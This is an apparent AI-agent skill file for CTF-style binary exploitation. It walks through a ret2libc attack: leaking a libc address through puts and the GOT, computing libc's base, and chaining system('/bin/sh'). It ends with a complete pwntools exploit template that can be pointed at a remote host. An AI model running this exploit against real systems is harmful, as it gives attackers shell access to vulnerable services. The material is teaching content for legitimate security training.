---
name: rop-leak-libc
description: How to exploit buffer overflow vulnerabilities by leaking libc addresses using ROP chains. Use this skill whenever the user mentions buffer overflow, ROP, return-oriented programming, libc, GOT, PLT, binary exploitation, pwn challenges, CTF exploitation, or needs to find shellcode addresses in dynamic binaries. Make sure to use this skill for any binary exploitation task involving dynamic linking, address leaks, or ROP gadget chains, even if they don't explicitly say "ROP" or "libc leak".
---

# ROP Libc Address Leaking

A skill for exploiting buffer overflow vulnerabilities in dynamically-linked binaries by leaking libc function addresses and constructing ROP chains to gain shell access.

## When to Use This Skill

Use this skill when:
- You have a vulnerable binary with a buffer overflow (e.g., `gets()`, `scanf()` without bounds checking)
- The binary is dynamically linked (uses libc functions like `puts`, `printf`, `system`)
- You need to find the libc base address to calculate `system()` and `/bin/sh` addresses
- You're working on CTF pwn challenges or binary exploitation tasks
- The binary has no PIE (Position Independent Executable) or you need to leak addresses despite ASLR

## Quick Workflow

1. **Find the overflow offset** - Determine how many bytes to write before overwriting RIP
2. **Find ROP gadgets** - Locate `pop rdi; ret`, `puts@plt`, and `main` addresses
3. **Leak libc address** - Use ROP to call `puts()` with a GOT entry as argument
4. **Identify libc version** - Match leaked address to known libc versions
5. **Calculate exploit addresses** - Compute `system()` and `/bin/sh` from libc base
6. **Execute final ROP** - Chain gadgets to call `system("/bin/sh")`

## Step 1: Finding the Offset

The offset is the number of bytes you need to write before overwriting the return address (RIP).

### Method 1: Using pwntools cyclic

```python
from pwn import *

# Attach to process and send cyclic pattern
p = process('./vuln')
gdb.attach(p, "c")
payload = cyclic(1000)
p.sendline(payload)

# In GDB, run: x/wx $rsp
# Then find the offset:
from pwn import *
cyclic_find(0x6161616b)  # Replace with the 4 bytes from GDB
```

### Method 2: Using GEF pattern

```bash
# In GDB with GEF
pattern create 1000
# Run program until crash
pattern search $rsp
```

**Save the offset** - You'll use this value throughout the exploit:
```python
OFFSET = "A" * 40  # Replace 40 with your actual offset
```

## Step 2: Finding ROP Gadgets

Load the binary and extract necessary addresses:

```python
from pwn import *

elf = ELF('./vuln')

# Key addresses for the exploit
PUTS_PLT = elf.plt['puts']           # Address of puts in PLT
MAIN = elf.symbols['main']           # Address of main (for re-entry)
POP_RDI = next(elf.gadgets['pop rdi; ret'])  # Gadget to set RDI register

log.info(f"Main: {hex(MAIN)}")
log.info(f"Puts PLT: {hex(PUTS_PLT)}")
log.info(f"Pop RDI: {hex(POP_RDI)}")
```

### What Each Address Does

| Address | Purpose |
|---------|--------|
| `PUTS_PLT` | Calls `puts()` to leak addresses |
| `MAIN` | Returns to main() for another exploitation attempt |
| `POP_RDI` | Sets RDI register (first argument to functions) |

### If `main` Symbol is Missing

Some binaries strip symbols. Find main manually:

```bash
objdump -d vuln | grep ".text"
# Look for the .text section start, e.g., 0x401080
```

```python
MAIN = 0x401080  # Set manually if needed
```

## Step 3: Leaking libc Address

The core technique: trick `puts()` into printing the address of a libc function.

### The Leak ROP Chain

```python
def leak_libc_address(func_name="puts"):
    """Leak the address of a libc function via GOT"""
    
    # Get the GOT entry address (where the function pointer is stored)
    FUNC_GOT = elf.got[func_name]
    log.info(f"{func_name} GOT @ {hex(FUNC_GOT)}")
    
    # Build ROP chain:
    # 1. Fill offset to reach RIP
    # 2. Pop RDI gadget
    # 3. Address of GOT entry (as argument to puts)
    # 4. Call puts (prints the GOT entry value = function address)
    # 5. Return to main for another attempt
    rop_chain = (
        OFFSET +
        p64(POP_RDI) +
        p64(FUNC_GOT) +
        p64(PUTS_PLT) +
        p64(MAIN)
    )
    
    # Send the payload
    p.sendline(rop_chain)
    
    # Receive the leaked address
    leaked = p.recvline().strip()
    leaked_addr = u64(leaked.ljust(8, b"\x00"))
    
    log.info(f"Leaked {func_name} address: {hex(leaked_addr)}")
    return leaked_addr
```

### How It Works

1. **OFFSET** - Fills the buffer until we overwrite RIP
2. **POP_RDI** - Pops the next value onto RDI (first argument register)
3. **FUNC_GOT** - The GOT entry address (contains the actual function address)
4. **PUTS_PLT** - Calls `puts(RDI)`, printing the libc function address
5. **MAIN** - Returns to main() so we can exploit again

### Alternative Functions to Leak

If `puts` isn't available, try:
- `printf`
- `__libc_start_main`
- `read`
- `gets`
- Any function in the GOT

## Step 4: Identifying libc Version

Once you have a leaked address, find which libc version it belongs to.

### Method 1: libc.blukat.me

1. Go to https://libc.blukat.me
2. Enter the function name (e.g., `puts`)
3. Enter the leaked address
4. Download the matching libc file

### Method 2: libc-database

```bash
git clone https://github.com/niklasb/libc-database.git
cd libc-database
./get  # Downloads all libc versions (takes time)

# Search for matching libc
./find puts 0x7ff629878690
# Output: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)

# Download the match
./download libc6_2.23-0ubuntu10_amd64
```

### Method 3: Local Binary (Easiest)

For local exploitation, just use your system's libc:

```python
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
```

## Step 5: Calculating Exploit Addresses

With the libc file loaded, calculate addresses for the final exploit:

```python
# Load the libc file
libc = ELF("libc.so.6")  # Or the downloaded version

# Calculate libc base from leaked address
libc.address = leaked_addr - libc.symbols["puts"]
log.info(f"libc base @ {hex(libc.address)}")

# Verify: base address should end in 00
assert libc.address % 0x1000 == 0, "Invalid libc base!"

# Get addresses for final exploit
SYSTEM = libc.sym["system"]
BINSH = next(libc.search(b"/bin/sh"))
EXIT = libc.sym["exit"]

log.info(f"system: {hex(SYSTEM)}")
log.info(f"/bin/sh: {hex(BINSH)}")
```

### Troubleshooting /bin/sh Address

If you get `sh: 1: %s%s%s%s%s%s%s%s: not found`, the `/bin/sh` string might be offset:

```python
BINSH = next(libc.search(b"/bin/sh")) - 64
```

## Step 6: Final Exploit

Now construct the shell-spawning ROP chain:

```python
# Final ROP chain to get a shell
rop_shell = (
    OFFSET +
    p64(POP_RDI) +
    p64(BINSH) +
    p64(SYSTEM) +
    p64(EXIT)  # Clean exit to avoid alerts
)

# Send and interact
p.sendline(rop_shell)
p.interactive()
```

### How the Final Chain Works

1. **OFFSET** - Fill buffer to reach RIP
2. **POP_RDI** - Set up first argument
3. **BINSH** - Address of "/bin/sh" string
4. **SYSTEM** - Call `system("/bin/sh")`
5. **EXIT** - Clean process termination

## Alternative: ONE_GADGET

For a simpler approach, use [one_gadget](https://github.com/david942j/one_gadget):

```bash
one_gadget libc.so.6
# Output: 0x4526a  ; constraints: [rsp+0x30] == NULL
```

```python
ONE_GADGET = libc.address + 0x4526a

# Satisfy constraints (e.g., [rsp+0x30] == NULL)
rop_shell = OFFSET + p64(ONE_GADGET) + b"\x00" * 100

p.sendline(rop_shell)
p.interactive()
```

## Complete Template

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
OFFSET = "A" * 40  # Change to your offset
BINARY = "./vuln"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"  # Or downloaded libc

# Setup
context.log_level = "info"
elf = ELF(BINARY)
libc = ELF(LIBC_PATH) if LIBC_PATH else None

# Connect
p = process(BINARY)  # Or remote("host", port)

# Find gadgets
PUTS_PLT = elf.plt['puts']
MAIN = elf.symbols.get('main', 0x401080)  # Manual if needed
POP_RDI = next(elf.gadgets['pop rdi; ret'])

# Phase 1: Leak libc address
def leak_libc():
    FUNC_GOT = elf.got['puts']
    rop = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN)
    p.sendline(rop)
    leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.info(f"Leaked puts: {hex(leaked)}")
    return leaked

leaked_puts = leak_libc()

# Phase 2: Calculate libc base
if libc:
    libc.address = leaked_puts - libc.symbols['puts']
    log.info(f"libc base: {hex(libc.address)}")

# Phase 3: Get shell
SYSTEM = libc.sym['system']
BINSH = next(libc.search(b"/bin/sh"))

rop_shell = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
p.sendline(rop_shell)
p.interactive()
```

## Common Issues & Solutions

| Problem | Solution |
|---------|----------|
| `main` symbol not found | Use `objdump -d` to find `.text` section start |
| `puts` not in GOT | Try `printf`, `read`, or other libc functions |
| `sh: 1: %s%s%s%s...` error | Subtract 64 from `/bin/sh` address |
| libc base doesn't end in 00 | You leaked the wrong address or wrong libc version |
| Segfault after leak | Check offset is correct, verify gadget addresses |
| ASLR still active | Leak address first, then calculate offsets |

## Practice Resources

- [Taste of Security - Ret2Libc](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)
- [Made0x78 - B Series Ret2Libc](https://made0x78.com/bseries-ret2libc/)
- [GuyInATuxedo - CSAW19 BabyBoi](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- [Libc Database](https://github.com/niklasb/libc-database)
- [Libc Blukat](https://libc.blukat.me)

## Key Concepts

- **GOT (Global Offset Table)**: Stores actual addresses of libc functions
- **PLT (Procedure Linkage Table)**: Jump table for calling libc functions
- **ROP (Return-Oriented Programming)**: Chaining existing code snippets (gadgets)
- **ASLR (Address Space Layout Randomization)**: Randomizes memory addresses
- **PIE (Position Independent Executable)**: Makes the binary itself position-independent
